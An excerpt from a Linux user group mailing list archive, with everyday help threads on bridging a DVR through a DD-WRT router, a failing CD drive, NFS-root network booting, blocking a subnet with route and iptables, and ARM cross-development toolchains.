for many years. It still works fine. I recently bought a used ReplayTV 
4080 DVR. It uses an Ethernet connection to get TV program info. 
Currently there is an Ethernet cable running across the floor in the TV 
room. It connects the ReplayTV to a switch that is connected to the 
router. Besides being a tripping hazard, it is unsightly to my wife 
(well, me, too) so I'm considering getting bridge to use to wirelessly 
connect the ReplayTV. I understand that I need a wireless router, or I 
suppose a second bridge, to make this work. I have a Linksys WRT54G that 
I just got from my sister (she upgraded to a Mac, and has Mac network

it go through the Netgear router? If so, when I set it up, do I treat 
the WRT54G as a PC on the home network, and assign it an IP address from 
the Netgear's set? Anything else that I'm missing?


I found a web site for setting up the WRT54G:

Dick,
Flash with with DD WRT/Open WRT and you can put it in bridge mode so
it'll just act as a range extender for the Netgear and you should be
good to go.

software version you have and read on.

Subject: [PLUG] Ubuntu Installation Problems
Message-ID: <4BAEA78E.5000701@comcast.net>

As I mentioned earlier, my sister recently replace her PC with a Mac. I 
now have a spare Sempron 2400+. I upgraded the memory from 256 MB to 
1.256 GB.

I decided to use the box to try out other distros. I started by burning 
Ubuntu 10. When I boot from that CD I got a message that talked about 
"init: ureadahead-other main process (971) terminated with status 4". 
That message repeated two more times, the only difference was that the 
971 was replaced by 972 and 973, respectively.

I Googled that error message and found that there was some disagreement 
as to whether the problem was with plymouth or the kernel.

Being more interested in seeing the machine do something, I downloaded 
and burned a CD of Ubuntu 9. This time the machine booted from the CD 
and, with my agreement, proceeded to wipe XP from the drive and begin 
the install. I've got it hooked up with a KVM switch so while it was 
working I went back to this machine. I checked back every so often and 
saw when it was 60 something % finished, and then again when it was 74% 
finished. It stayed at 74% for some time. Finally, I heard the drive 
stop seeking and looked again. All that was there was the background 
image, the one that looks like sun on a sand dune.

I took the CD out and rebooted, hoping to find that it would just start 
up, but apparently the installer hadn't finished.

So I rebooted with the CD, figuring that I'd have to at least do some of 
it over again. I got the message:

Boot from CD:
DISK BOOT FAILURE, INSERT SYSTEM DISK AND PRESS ENTER

Several attempts always gave the same result. So, I thought I'd try the 
Ubuntu 10 CD again. I get the same DISK BOOT FAILURE message on that 
one, too.

Does this sound like a bad CD drive?

I had removed the CD burner from the box and installed in this machine 
since all I had in it was a CD reader. I put that reader into the new 
box. I don't recall having any trouble with it as a CD reader over the 
last couple of years.

Hardware versions V5.0 through V8.2 (latest) only support a micro
version due to FLASH/RAM reductions.

Here's the somewhat hard to find supported routers link:
http://www.dd-wrt.com/wiki/index.php/Supported_Devices

I'm about to embark on a 3-router bridge/WDS effort with WRT54GLs so I
can't say how it works on WRT54Gs with "full" FLASH and RAM size just
yet, but I did have great success with DD-WRT setting up WDS using
really cheap AirLink101+ AR670W hardware. It Just Worked. YMMV of
course.  :)

If you want to go WDS instead of bridging the key is having the same
radio chip(s) in all the routers.

Good luck,

NealS

Extend the range of what? The Netgear he mentioned isn't wireless.

Flash the WRT or not, but just disable DHCP and connect it to the 
Netgear via one of the LAN ports. Assign it an IP on the same subnet as 
the Netgear also. Not it's basically an access point. Then go get a 
WET54G bridge and connect that to the ReplayTV to bridge it to the WRT.

I have both Ubuntu & Kubuntu installed from Alpha 2 disks.  Both 
installs have been through daily updates.  I am still getting the 
ureadahead message at boot up from both.

Hope someone can help with the CD drive.

Sounds like some bad hardware...CD ROM or motherboard or hdd.

I just installed Ubuntu 10.04 beta on an extra hdd and it's running very
well. Looking forward to the final version April 29.

I have a network installed copy of Fedora 12 in Virtual Box and the

but every time I try to network boot I run into timeouts trying to
get the NFS port numbers followed by using defaults followed by

can mount the share in question no problem.  I tried increasing
the verbosity of NFS daemon logging, but that just poured a

change the default port in the kernel for nfsd and mountd?  Can
I specify the correct ports as command line arguments?  In my
case 2049 for NFS and 4002 I think for mountd.

Yes, it is repeatable and I used this command:

   sudo route delete $IP 127.0.0.1

Do you really route $IP through 127.0.0.1?

Having said that...

A visit to `man route` would be in order then you'd see the sytax for the command is
something like:

   sudo route delete -net $IP netmask $MASK gw $GW_IP

Having had to look it up myself, I kept playing thinking "there has to be an easier way.
So far the "best" is:

   sudo route del -net $IP netmask $MASK dev $IFACE

If you have more than one network interface $IFACE may need to be determined with something like:

  michael at hive:~/play$ netstat -nr
  Kernel IP routing table
  Destination     Gateway         Genmask         Flags   MSS Window  irtt Iface
  64.105.252.40   0.0.0.0         255.255.255.248 U         0 0          0 eth0
  192.168.14.0    64.105.252.41   255.255.255.0   UG        0 0          0 eth0
  169.254.0.0     0.0.0.0         255.255.0.0     U         0 0          0 eth0
  0.0.0.0         64.105.252.41   0.0.0.0         UG        0 0          0 eth0

And the relevant clue stick from `man route` is:

    SYNOPSIS

       route  [-v] [-A family] del [-net|-host] target [gw Gw] [netmask Nm] [metric N] [[dev] If]

Silly me, I should read beyond the synopsis.

     sudo route del -net $IP/$CIDR dev $IFACE

is the simple, quick command.

Or try burning the disc at a lower speed. I never burn above 32x, but I 
have read with some DVD ISO's people say it's necessary to burn at much 
lower speeds. Personally I don't have trouble at 32x, but I don't buy 
generic media.

You never have trouble though until you do. Optical drives in general 
aren't reliable. They're so cheaply made now. Plextor is the best bet 
for quality as I rarely see those die. You're going to pay a lot more 
though. I often see optical drives which read commercial media but not 
burned discs. This is just the drive telling you it's on its way out. 
IMO it's the laser that weakens when this happens.

It's been 20 years since I cracked open a CD player. I learned a lot
about cheap manufacturing when I did. The worm gear for the laser
aligning mechanism was made of cheap nylon. As soon as the teeth wore
(after a year of use), it could no longer track, and would skip
endlessly. Whatever happened to the squirm gear?

Thanks for your reply.  I am a networking novice so maybe there is something
that I am doing wrong.
I just did this:

   sudo  route  del  -net  98.171.145.0/24  dev  eth0

and got back

   SIOCDELRT: No such process


I do not have a static route to that subnet in my routing table but I want
to cut off traffic to any of the 255 hosts in that subnet for a short period
of time -- hence I want to delete access to that network.
Am I using the wrong tool?

Yep, you can't delete a route that isn't there.

You could add a route for that network that points to an address which can't 
route to the network, for example:

    sudo route add -net 98.171.145.0/24  gw 127.0.0.1

or if you just need it for the current host you could add an iptables rule to 
block traffic: 

    sudo iptables -I OUTPUT -d 98.171.145.0/24 -j DROP

if the current host is your router then the iptables rule would be:

    sudo iptables -I FORWARD -d 98.171.145.0/24 -j DROP

Note:  my iptables examples are horribly simplified things.

Drives used in music players are even worse, in my experience. Several
years ago I bought a Sony 300 CD changer thinking I could load my entire
music collection into it and be able to control my music selections
with the remote control. It lasted a couple months past the one year
warranty before it started skipping. And I didn't even use it very much.

I've never had an optical drive in a computer go out, in spite of the
severe use they get. Guess I've been lucky.

My next acquisition will be a blueray for my desktop. I'll have to
check reviews carefully.

thank you michael. Forgot about iptables and blocking them which is
essentially the same effect.
I will give that a try.  Thanks!

Yep. Bad CD ROM drive. I replaced it with another one I had in the 
spares box. Ubuntu 9 loaded in short order.

Thanks to all for the recommendations.

Are you sure that you are getting an IP address?
Pxelinux only loads the info from the server and passes the args to the kernel.
If the kernel args don't have the proper info, you will get this type of thing.
I still think '--ip=dhcp' is wrong.  Should be 'ip=dhcp'.

Does the client machine have more than one network interface?
If this is the case the boot interface may not have access to the
correct network and
pxelinux doesn't know that.

Have you tried it without all the deny rules and doing ALL:ALL for allow?
When this is happening have you looked at the logs to determine if
there was any
denied access?

Have you tried monitoring from the server with tcpdump or wireshark?

Subject: [PLUG] Is anyone in the group doing cross-development?
Message-ID: <4BB0E474.80509@wescottdesign.com>

Is anyone doing cross-development for embedded microprocessors using 
Linux on the host?  Specifically, I'm reviving a project that uses an 
Arm Cortex M3 with an OpenOCD debug pod.  I'd _like_ to do the 
development all under Linux, without having to slide over to Windows.

But when I try to do web searches for this, I find lots of material on 
using Linux in the target, but not a lot about setting up and using the 
tool chain when you're using Linux on the host.

Any guidance appreciated, even if it's better search terms!

* pun intended, of course.

I'm not doing it now, but I've done it in the past, using something
called crosstool, and it was pretty easy.
      http://www.kegel.com/crosstool/

Well easy for me.  Not easy on the computer, as it had to rebuild
everything in the world, starting with gcc.

Also, I'm not sure that crosstool has been kept up to date.  I was
using it in 2004/2005, and the last date noted on that web page is
2006.

Unless you're keen on building your own tools, I'd suggest using a 
pre-built toolchain from CodeSourcery.  I'd also suggest subscribing 
to their mailing list.  They often answer questions from people using 
the free edition.  Of course they would be happy to sell you a 
supported version too.  CodeSourcery is one of the primary 
contributors to the GCC ARM port.

The original crosstool script has ceased new development. 
crosstool-ng is the latest thing.  If you go this route, be sure to 
subscribe to the crossgcc mailing list.

Did in the past.  We used the Monta Vista toolchain(s) but the source
tree was cross-building
as 586,arm and Mips64(Cavium).  Looked at crosstool but MontaVista
provided board support packages
which removed a lot of the initial setup pain.  We evaluated the GUI
tools but ended up with just the toolchain.


We basically set a few environmental variables(paths, arch, tools
chain variables) and then launched the build.
We used a Makefile wrapper on each package to limit the changes needed.

I looked at using buildroot with crosstool but by the time I was ready
to do this, the project was shutdown (at least for me).

Thanks Galen -- I had looked for the codesourcery stuff, but they don't 
exactly feature it prominently on their website any more.

I'll give it a whirl, now that I can find it.

Thanks Larry, the -- needed to be taken out.  Now I need to modify the
startup scripts and fstab so that I can get past the filesystem check
stage.  Anyone know of a HOWTO that discusses modifying the stock
scripts of an LFS system for NFS root?  Is there a slick way to slip
in a different fstab for network booting that what I would use for
local booting?

Well, I have an excellent Fedora 12 VirtualBox?VM. I think VirtualBox lacks USB support for the guest, which might be a disadvantage for some.

Hello,

I beg to differ:
http://www.virtualbox.org/manual/ch03.html#id2520132

VirtualBox does indeed support USB for the guest, you need to be sure it is
enabled in the configuration settings for your particular VM.

I have been using VirtualBox successfully for some time now, on Windows host
and Linux host, running all manner of guest VMs- Windows, Linux,
OpenSolaris.... etc.

Subject: [PLUG] How to create the NFS root...
Message-ID: <1269937714.2700.18.camel@localhost>

filesystem?

I have a hunch that I want to do an initial root file system that mounts
the machine specific root file system and pivots to it.

How do I go about doing this?  I have a Linux from scratch system 
that I am trying to get the necessary pieces from.  The init scripts 
are designed for local disk based booting, I need to create new ones.
A gentoo howto on diskless machines shows ip=dhcp with a share
assigned for the root filesystem that is obviously not a dynamic
reference.  If I am doing 192.168.5.x for each work station
respectively, I should determine somehow at boot which share is needed
based on which machine is booting.

Any pointers on information about how to write rc scripts for system V
style init?  What is the first script that gets executed during boot?

On a hunch, I figure that I need a customized etc, a copy of bin, sbin,
and lib off of the LFS system, a couple of directories for the kernel 
to create an initial root file system along with a device directory.
I'm wondering if my initial root filesystem can use udev and how to
set that up?  Directories such as home and usr should be, I figure,
separate NFS shares that are shared by all workstations.

The following shows the base directory for what I plan on exporting via
NFS:

[admin at goose ~]$ cd /nfsroot/lfsp3/
[admin at goose lfsp3]$ ls
boot  eagle  home  usr  vmeagle

The following is what I have so far for the initial root system:

[admin at goose lfsp3]$ cd boot
[admin at goose boot]$ ls
bin  dev  etc  lib  proc  sbin  srv  sys

The following shows the local disk installation of Linux From Scratch on
the server side:

[admin at goose boot]$ ls /lfsp3/
bin   dev  home  lost+found  mnt  proc  sbin  sys  usr
boot  etc  lib   media       opt  root  srv   tmp  var

Note that there are some directories that I am not copying at all and so
far etc in the boot directory is being created from scratch.

So far what I have come up with does not allow for an initial console.

I suppose an initrd is an option, but I don't think I have to do that in
the traditional way.  I'm thinking mount the machine specific NFS share
on the mounted root file system and do a chroot.

There are certain things I want to synchronize such as the password
files under etc, but I don't know how to go about that.  It would be
nice if for workstation A there could be configuration information
specific to that machine.  The purpose of this NFS root system is
to make doing backups to a network server easy.  I am thinking an
nfs root system that can mount and dump local drives.  I am also
intending to have network troubleshooting tools installed.

I do embedded Linux and the only time I have used windows for that to to
access the Linux servers (that was a strange setup).  Mostly it's all
done with Linux.  First question what if any tools does the provider of
your board or processor provide.

OpenOCD was developed on Linux and is well supported there (search for
OpenOCD).

You should be able to get an SDK (or an LDK or a fooDK) and there should
be a version that runs under Linux.  I have rolled my own SDK with
Buildroot  http://buildroot.uclibc.org/.

If you have any questions drop me a line setting up a development
environment is not all that hard, but there are a lot of little fiddly
bits.

Yes.  A gz compressed cpio file with the contents of you script, shell
and any necessary libraries and modules
if needed. Yes you can have modules for nfs root when you have one of these.

The host machine would just export all workstation paths from the same
location (or not if you like complicated).

Nope.  In the initrd you have a single script not a system V set of scripts.
If you have a Fedora or Centos 5 machine then you have some examples
of init scripts for your initrd.

Yes a full copy of your server file system for each workstation.
Hardlinks and read-only on things
that you don't really need to change (or want changed).
Home directories -> automounter with NIS.
Udev is just a couple of processes associated kernel options  that
mknod based on kernel devices found
on a tmpfs mounted directory.

Yes.  That would fit well with a couple of the topics I was suggesting.
Would you will willing to spend a few minutes (say 5 minutes) talking
discussing
the need for a public cloud?  That would be great.

yay! now we wait to see if there's anyone who'll fund an appeal. my 
bet is no, but some people just can't stay away from courtrooms.

Message-ID: <r2t4a0b36aa1003311504j7bda0647xc907e328d6bfc7e4@mail.gmail.com>

Hi:

I have written a Java program that performs ICMP Echo to a bunch of remote
sites.
Every now and then, it would say a bunch of sites are not reachable but I
can get to them just fine.
I am suspecting the process may be saturating some routers.

Is there a way to measure how many bytes is in each ICMP Echo request?  I do
not play with that size so I would imagine it is the default but I still
want to monitor outbound traffic to confirm.

Host is Linux.

Thanks in advanced for any tips.

Have you tried cracking out wireshark to sniff and visualize the
packets?
